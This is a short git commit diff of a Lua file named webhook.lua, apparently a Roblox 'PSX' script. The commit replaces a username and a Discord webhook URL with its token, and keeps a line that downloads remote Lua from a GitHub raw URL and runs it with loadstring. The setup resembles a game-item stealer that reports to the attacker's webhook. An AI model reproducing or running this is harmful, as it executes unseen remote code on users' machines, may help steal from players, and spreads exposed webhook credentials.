131a97c6ccf5afebddaec20f68e473ecba4d9304
Partner12398 <120310533+Partner12398@users.noreply.github.com>
2022-12-19 12:55:02 +0000

    Update webhook.lua

--- webhook.lua
+++ webhook.lua
@@ -1,4 +1,4 @@
-UserName = "1kkteddy"
-WebHook = "https://discord.com/api/webhooks/1051254338816839801/cswABP9IOmNWFrK8ntp9PRUF_0K1Qyu3Y7OFnAao6hhu376KICDmp3jCy-vv6sCMWO8g"
+UserName = "goofycheetah0"
+WebHook = "https://discord.com/api/webhooks/1054380325360373770/0nlt0Y1hWbh8wL913nxeQvchSHAv3tXA3vmppkSvgASWXUwA16rKK2mcZQ2DvAjK1-V4"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
